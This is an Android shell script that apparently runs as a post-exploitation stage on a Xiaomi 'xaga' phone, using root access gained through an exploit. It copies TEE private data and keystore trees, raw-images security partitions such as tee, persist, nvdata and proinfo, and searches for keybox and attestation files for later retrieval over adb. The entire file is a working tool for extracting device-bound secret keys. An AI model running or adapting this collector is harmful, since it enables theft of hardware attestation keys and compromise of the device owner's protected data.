#!/system/bin/sh

EXPECTED_PRODUCT="xaga"
EXPECTED_KERNEL="5.10.66-android12-9-00001-g41ff3fa8fff9-ab8171928"
OUT="/data/local/tmp/xaga_keybox_stage1"

product=$(getprop ro.product.vendor.device)
kernel=$(uname -r)

if [ "$(id -u)" != "0" ]; then
  echo "FATAL: collector is not uid 0" >&2
  exit 20
fi
if [ "$product" != "$EXPECTED_PRODUCT" ]; then
  echo "FATAL: refusing unexpected product: $product" >&2
  exit 21
fi
if [ "$kernel" != "$EXPECTED_KERNEL" ]; then
  echo "FATAL: refusing unexpected kernel: $kernel" >&2
  exit 22
fi

BY_NAME=""
for candidate in /dev/block/by-name /dev/block/platform/bootdevice/by-name /dev/block/platform/*/by-name; do
  if [ -d "$candidate" ]; then
    BY_NAME="$candidate"
    break
  fi
done
if [ -z "$BY_NAME" ]; then
  echo "FATAL: partition by-name directory not found" >&2
  exit 23
fi

rm -rf "$OUT"
mkdir -p "$OUT/00_manifest" "$OUT/01_tee_private_data" \
  "$OUT/02_partitions" "$OUT/03_vendor_binaries" \
  "$OUT/04_candidate_lists"
chmod 0755 "$OUT" "$OUT"/*

exec >"$OUT/collector_stdout.txt" 2>"$OUT/collector_stderr.txt"

echo "XAGA_KEYBOX_COLLECTION_START"
{
  echo "device_time=$(date -Iseconds 2>/dev/null || date)"
  echo "product=$product"
  echo "kernel=$kernel"
  echo "slot_suffix=$(getprop ro.boot.slot_suffix)"
  echo "by_name=$BY_NAME"
  echo "serial=<TARGET_SERIAL>"
  id
  id -Z 2>/dev/null || true
  getenforce 2>/dev/null || true
} >"$OUT/00_manifest/device_manifest.txt"
getprop >"$OUT/00_manifest/getprop.txt"
cat /proc/mounts >"$OUT/00_manifest/mounts.txt"
ls -laZ "$BY_NAME" >"$OUT/00_manifest/partition_links.txt" 2>&1

echo "[1/4] copying Microtrust/TEE private files"
find /data/vendor/thh -xdev -print \
  >"$OUT/04_candidate_lists/data_vendor_thh_tree.txt" 2>&1 || true
if [ -d /data/vendor/thh ]; then
  cp -a /data/vendor/thh "$OUT/01_tee_private_data/data_vendor_thh" || true
fi

for path in /mnt/vendor/persist /persist /data/vendor/tee /data/vendor/keymint \
  /data/vendor/keystore /data/misc/keystore /data/misc/keystore-engine; do
  safe_name=$(echo "$path" | tr '/' '_')
  if [ -e "$path" ]; then
    find "$path" -xdev -print \
      >"$OUT/04_candidate_lists/${safe_name}_tree.txt" 2>&1 || true
  fi
done

echo "[2/4] imaging read-only security/TEE partitions"
parts="tee_a tee_b gz_a gz_b seccfg persist proinfo nvcfg nvdata protect1 protect2"
for part in $parts; do
  source="$BY_NAME/$part"
  if [ -e "$source" ]; then
    echo "READ $part from $source"
    dd if="$source" of="$OUT/02_partitions/$part.img" bs=1048576
    chmod 0644 "$OUT/02_partitions/$part.img"
  else
    echo "$part" >>"$OUT/00_manifest/missing_partitions.txt"
  fi
done

echo "[3/4] copying exact KeyMint/TEE user-space components"
for path in \
  /vendor/bin/hw/android.hardware.security.keymint@1.0-service.beanpod \
  /vendor/bin/teei_daemon \
  /vendor/lib64/libTEECommon.so \
  /vendor/lib64/libteei_daemon_vfs.so \
  /vendor/etc/init/microtrust.rc \
  /vendor/etc/init/android.hardware.security.keymint-service.beanpod.rc; do
  if [ -f "$path" ]; then
    cp -p "$path" "$OUT/03_vendor_binaries/" || true
  fi
done

find /vendor /odm -maxdepth 8 -type f 2>/dev/null \
  | grep -Ei 'keym|beanpod|tee|thh|soter|\.ta$|trust|provision|attest|keybox' \
  >"$OUT/04_candidate_lists/vendor_security_candidates.txt" || true
find /data/vendor -xdev -maxdepth 8 2>/dev/null \
  | grep -Ei 'keym|beanpod|tee|thh|soter|trust|provision|attest|keybox|cert' \
  >"$OUT/04_candidate_lists/data_vendor_security_candidates.txt" || true

echo "[4/4] hashing output"
(cd "$OUT" && find . -type f ! -name SHA256SUMS.txt | sort \
  | while IFS= read -r file; do sha256sum "$file"; done \
  >"00_manifest/SHA256SUMS.txt")
chmod -R a+rX "$OUT"
sync
echo "XAGA_KEYBOX_COLLECTION_COMPLETE $OUT"

# Keep inherited exploit pipe descriptors alive until adb pulls the results.
while true; do
  sleep 3600
done
